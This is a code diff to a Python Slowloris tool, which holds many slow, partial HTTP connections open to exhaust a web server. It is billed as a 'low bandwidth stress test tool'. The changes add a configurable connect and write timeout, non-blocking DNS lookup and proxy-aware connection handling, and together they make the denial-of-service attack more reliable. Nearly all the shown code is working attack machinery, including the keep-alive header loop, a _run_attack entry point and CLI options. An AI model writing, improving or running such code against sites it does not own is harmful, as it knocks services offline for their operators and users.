@@ -19,7 +19,6 @@ from __future__ import annotations
 import asyncio
 import logging
 import random
-import secrets
 import signal
 import socket
 import ssl
@@ -113,6 +112,7 @@ class Config:
     https: bool = False
     sleeptime: float = 15.0
     jitter: float = 3.0
+    connect_timeout: float = 10.0
 
     # Post-initialization validation
     def __post_init__(self) -> None:
@@ -127,6 +127,8 @@ class Config:
             raise ValueError(f"Sleeptime must be positive, got {self.sleeptime}")
         if self.jitter < 0:
             raise ValueError(f"Jitter must be non-negative, got {self.jitter}")
+        if self.connect_timeout <= 0:
+            raise ValueError(f"Connect timeout must be positive, got {self.connect_timeout}")
 
     def to_dict(self) -> dict[str, object]:
         """Convert config to dictionary for serialization."""
@@ -203,19 +205,20 @@ class Slowloris:
             sock = await proxy.connect(
                 dest_host=self.config.host,
                 dest_port=self.config.port,
-                timeout=10,
+                timeout=self.config.connect_timeout,
             )
             return await asyncio.wait_for(
                 asyncio.open_connection(sock=sock, ssl=self._ssl),
-                timeout=10.0,
+                timeout=self.config.connect_timeout,
             )
 
-        # Resolve address with IPv6 support
-        addrinfo = socket.getaddrinfo(
+        # Resolve address with IPv6 support (non-blocking DNS on the event loop)
+        loop = asyncio.get_running_loop()
+        addrinfo = await loop.getaddrinfo(
             self.config.host,
             self.config.port,
-            socket.AF_UNSPEC,
-            socket.SOCK_STREAM,
+            family=socket.AF_UNSPEC,
+            type=socket.SOCK_STREAM,
         )
 
         last_error: Exception | None = None
@@ -224,7 +227,7 @@ class Slowloris:
                 host_addr: str = str(sockaddr[0])  # Cast to str for type safety
                 return await asyncio.wait_for(
                     asyncio.open_connection(host_addr, self.config.port, ssl=self._ssl),
-                    timeout=10.0,
+                    timeout=self.config.connect_timeout,
                 )
             except OSError as e:
                 last_error = e
@@ -254,7 +257,7 @@ class Slowloris:
         ]
         for line in lines:
             writer.write(line.encode())
-        await writer.drain()
+        await asyncio.wait_for(writer.drain(), timeout=self.config.connect_timeout)
 
     async def _worker(self) -> None:
         """Maintain a single Slowloris connection."""
@@ -262,17 +265,16 @@ class Slowloris:
             writer: asyncio.StreamWriter | None = None
             try:
                 # Use async context manager for automatic cleanup
-                reader, writer = await self._open_connection()
+                _reader, writer = await self._open_connection()
                 self._connections_created += 1
                 await self._send_initial_request(writer)
 
                 while not self._shutdown.is_set():
                     # Send keep-alive header
                     if writer and not writer.is_closing():
-                        # Use secrets for cryptographic randomness
-                        header_val = secrets.randbelow(5000) + 1
+                        header_val = random.randint(1, 5000)
                         writer.write(f"X-a: {header_val}\r\n".encode())
-                        await writer.drain()
+                        await asyncio.wait_for(writer.drain(), timeout=self.config.connect_timeout)
 
                     # Calculate sleep time with jitter
                     if self.config.jitter > 0:
@@ -439,6 +441,12 @@ async def _run_attack(config: Config) -> None:
     type=float,
     help="Random jitter added to sleep time (default: 3)",
 )
+@click.option(
+    "--connect-timeout",
+    default=10,
+    type=float,
+    help="Timeout in seconds for connecting and writing (default: 10)",
+)
 @click.version_option(version=__version__)
 def main(
     host: str | None,
@@ -452,6 +460,7 @@ def main(
     https: bool,
     sleeptime: float,
     jitter: float,
+    connect_timeout: float,
 ) -> None:
     """Slowloris - Low bandwidth stress test tool for websites."""
 
@@ -473,6 +482,7 @@ def main(
             https=https,
             sleeptime=sleeptime,
             jitter=jitter,
+            connect_timeout=connect_timeout,
         )
     except ValueError as e:
         click.echo(f"Error: {e}", err=True)
